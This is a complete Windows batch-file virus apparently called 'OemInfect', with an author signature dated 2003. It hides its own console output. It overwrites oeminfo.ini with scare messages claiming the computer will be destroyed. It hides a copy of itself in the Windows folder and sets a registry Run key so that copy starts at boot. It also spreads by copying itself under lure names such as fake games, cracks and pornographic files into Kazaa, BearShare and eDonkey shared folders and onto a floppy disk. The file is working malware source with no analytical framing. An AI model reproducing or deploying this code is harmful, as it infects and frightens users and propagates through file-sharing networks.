ctty nul
echo off
echo [general]>C:\WINDOWS\system\oeminfo.ini
echo Manufacturer=Not touch>>C:\WINDOWS\system\oeminfo.ini
echo Model=Explosive>>C:\WINDOWS\system\oeminfo.ini
echo
echo [OEMSpecific]>>C:\WINDOWS\system\oeminfo.ini
echo "SubModel=<My Computer>" >>C:\WINDOWS\system\oeminfo.ini
echo "SerialNo=<170184>" >>C:\WINDOWS\system\oeminfo.ini
echo  "OEM1=<01.02.03>" >>C:\WINDOWS\system\oeminfo.ini
echo "OEM2=<Eintrag>" >>C:\WINDOWS\system\oeminfo.ini
echo [Support Information]>>C:\WINDOWS\system\oeminfo.ini
echo Line1=Danger!!!>>C:\WINDOWS\system\oeminfo.ini
echo Line2=Your computer will be destroyed!!! >>C:\WINDOWS\system\oeminfo.ini
echo Line3=The dangerous mistake in a consequence on your computer was found the very dangerous virus has got!!! >>C:\WINDOWS\system\oeminfo.ini
echo Line4=He format your winchester, spoils CMOS, burns the monitor and hypnosis your mind!! >>C:\WINDOWS\system\oeminfo.ini
echo Line5=Never more include your computer!!! >>C:\WINDOWS\system\oeminfo.ini
copy %0 %windir%\oem.bat >nul
@attrib +h +s %windir%\oem.bat >nul
md C:\HOTgames
copy %0 c:\HOTgames\HOTgirls.exe.bat >nul
copy %0 c:\HOTgame.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Love.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_sex.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Games.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Freesoft.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky_crack.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_mp3.mp3.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Porno.jpg.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Porn.jpg.bat >nul
subst Y: c:\HOTgames
echo REGEDIT4>C:\yos.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yos.reg
echo "oeminfect"="%windir%\\oem.bat" >> C:\yos.reg
regedit /s C:\yos.reg
del C:\yos.reg
echo This is oeminfo joke. >>%windir%\info.txt
echo Little p2p virus. >>%windir%\info.txt
echo Name "OemInfect" >>%windir%\info.txt
echo By AlEkS >>%windir%\info.txt
echo top50@inbox.ru >>%windir%\info.txt
echo Ukraine >>%windir%\info.txt
echo  15.01.2003 >>%windir%\info.txt
copy %0 A:\News.txt.bat >nul
ctty con
cls